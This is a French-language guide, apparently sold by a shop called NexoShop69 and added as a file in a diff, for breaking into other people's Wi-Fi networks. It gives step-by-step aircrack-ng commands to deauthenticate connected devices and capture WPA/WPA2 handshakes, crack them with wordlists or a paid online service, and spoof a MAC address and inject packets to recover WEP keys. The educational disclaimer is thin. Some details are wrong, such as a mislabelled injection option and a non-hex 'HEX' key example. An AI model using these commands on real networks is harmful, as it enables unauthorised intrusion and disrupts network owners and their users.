@@ -1,0 +1,154 @@
+╔══════════════════════════════════════════════════════════╗
+║          🔓 GUIDE COMPLET — HACK WIFI                   ║
+║              NexoShop69 — CONFIDENTIEL                  ║
+╚══════════════════════════════════════════════════════════╝
+
+⚠️ IMPORTANT : Ce guide est fourni à titre éducatif uniquement.
+Toute utilisation sur un réseau sans autorisation explicite
+du propriétaire est illégale dans la plupart des pays.
+NexoShop69 décline toute responsabilité.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📋 MÉTHODE 1 — CRACK WPA/WPA2 (Kali Linux)
+   Protocole moderne, le plus répandu aujourd'hui
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+PRÉREQUIS :
+  • Un PC/laptop avec Linux (ou VM)
+  • Kali Linux : https://www.kali.org/downloads/
+  • Une carte Wi-Fi compatible mode monitor (TP-Link USB
+    ou adaptateur Alfa ~30€ recommandés si problème)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+ÉTAPE 1 — Installer et lancer Kali Linux
+  → Télécharge l'ISO depuis kali.org
+  → Installe sur clé USB (Rufus/Balena Etcher) ou en VM
+  → Démarre depuis la clé USB ou lance la VM
+
+ÉTAPE 2 — Vérifier ta carte Wi-Fi
+  Ouvre un terminal et tape :
+    iwconfig
+  → Tu dois voir ton interface (ex : wlan0)
+  → Si absent, ta carte n'est pas compatible → achetez
+    un adaptateur USB externe (Alfa AWUS036ACH)
+
+ÉTAPE 3 — Activer le mode Monitor
+    airmon-ng start wlan0
+  → L'interface s'appelle désormais wlan0mon (ou mon0)
+  → Si processus bloquants détectés, tape d'abord :
+    airmon-ng check kill
+
+ÉTAPE 4 — Scanner les réseaux Wi-Fi
+    airodump-ng wlan0mon
+  → Une liste de réseaux apparaît avec :
+     BSSID (adresse MAC du routeur)
+     CH    (canal du réseau)
+     ENC   (type de chiffrement : WPA, WPA2...)
+     PWR   (force du signal — plus proche de 0 = meilleur)
+     ESSID (nom du réseau)
+  → Choisis ta cible (signal le plus fort conseillé)
+  → CTRL+C pour arrêter le scan
+
+ÉTAPE 5 — Capturer le handshake
+  Remplace BSSID et CHANNEL par les valeurs de ta cible :
+    airodump-ng --bssid [BSSID] --channel [CH] -w /tmp/capture wlan0mon
+  → Laisse tourner dans ce terminal
+
+ÉTAPE 6 — Forcer la déconnexion d'un appareil connecté
+  Ouvre un 2ème terminal. Dans la sortie du terminal 1,
+  repère un appareil sous "STATION" (valeur Frames la plus haute).
+  Puis tape :
+    aireplay-ng -0 50 -a [BSSID_ROUTEUR] -c [MAC_STATION] wlan0mon
+  → "-0 50" = 50 paquets de désauthentification
+  → L'appareil est forcé à se reconnecter = handshake capturé !
+
+ÉTAPE 7 — Vérifier la capture du handshake
+  Dans le terminal 1, regarde en haut à droite :
+    "WPA handshake: [BSSID]" → ✅ Capturé !
+  Si rien après 1 minute, relance l'étape 6 avec plus de paquets.
+
+ÉTAPE 8 — Déchiffrer le hash (2 options)
+
+  OPTION A — En ligne (recommandé, rapide) :
+    → Va sur https://xsrc.ru
+    → Upload le fichier /tmp/capture-01.cap
+    → Résultats en quelques secondes à minutes
+    → Nécessite une clé (~10$) pour récupérer le mot de passe final
+
+  OPTION B — En local avec wordlist :
+    aircrack-ng -w /usr/share/wordlists/rockyou.txt /tmp/capture-01.cap
+    → Efficace si le mot de passe est courant (top 10M mots)
+    → Peut prendre de quelques secondes à plusieurs heures
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📋 MÉTHODE 2 — CRACK WEP (Backtrack / Kali Linux)
+   Protocole ancien, encore présent sur vieux routeurs
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+ℹ️ NOTE : Vérifie que le réseau cible utilise WEP (pas WPA).
+   WEP = colonne "ENC" dans airodump-ng affiche "WEP".
+
+ÉTAPE 1 — Préparer la carte réseau (spoof MAC)
+  Dans le terminal :
+    airmon-ng stop wlan0
+    ifconfig wlan0 down
+    macchanger --mac 00:11:22:33:44:55 wlan0
+    airmon-ng start wlan0
+  → Cette étape masque ta vraie adresse MAC
+
+ÉTAPE 2 — Scanner et choisir la cible WEP
+    airodump-ng wlan0mon
+  → Repère un réseau avec ENC = WEP
+  → Note son BSSID et son CH (canal)
+  → CTRL+C pour stopper
+
+ÉTAPE 3 — Capturer les paquets IV
+    airodump-ng -c [CHANNEL] -w wepkey --bssid [BSSID] wlan0mon
+  → Laisse tourner dans ce terminal
+  → Surveille le compteur "IV" — il doit monter
+  → Objectif minimum : 5 000 IV (idéalement 10 000–20 000)
+
+ÉTAPE 4 — Accélérer la collecte de paquets (2ème terminal)
+    aireplay-ng -1 0 -a [BSSID] -h 00:11:22:33:44:55 wlan0mon
+  → Injecte des paquets ARP pour faire monter le compteur IV
+    rapidement (des centaines par seconde)
+  → Le terminal 1 doit maintenant afficher le compteur IV
+    qui monte très vite
+
+ÉTAPE 5 — Cracker le mot de passe WEP (3ème terminal)
+  Dès que le compteur IV dépasse 5 000, dans un 3ème terminal :
+    aircrack-ng -b [BSSID] wepkey-01.cap
+  → Si "Not enough IVs", attends — aircrack reprend automatiquement
+  → Le mot de passe apparaît au format XX:XX:XX:XX...
+    Retire les ":" pour obtenir le mot de passe final
+  → Ex : 73:65:63:72:65:74 → "secret" (ASCII) ou 0F:KW:94 → 0FKW94 (HEX)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+💡 CONSEILS IMPORTANTS
+
+  • Signal fort = crackage plus rapide et plus fiable
+  • Si une station est connectée au réseau, la désauth
+    (méthode WPA étape 6) est bien plus efficace
+  • Pour WEP : les routeurs modernes n'utilisent plus WEP,
+    mais certains vieux modèles (box opérateur ancienne) oui
+  • Pour WPA2 avec wordlist : télécharge rockyou.txt
+    ou des wordlists françaises spécifiques
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔧 OUTILS UTILES
+
+  • Kali Linux    → https://www.kali.org/downloads/
+  • Crack en ligne → https://xsrc.ru
+  • Wordlist FR   → Cherche "wordlist french wifi" sur GitHub
+  • Adaptateur USB → Alfa AWUS036ACH (compatible monitor mode)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+⚠️ Garde cette méthode pour toi ! — NexoShop69
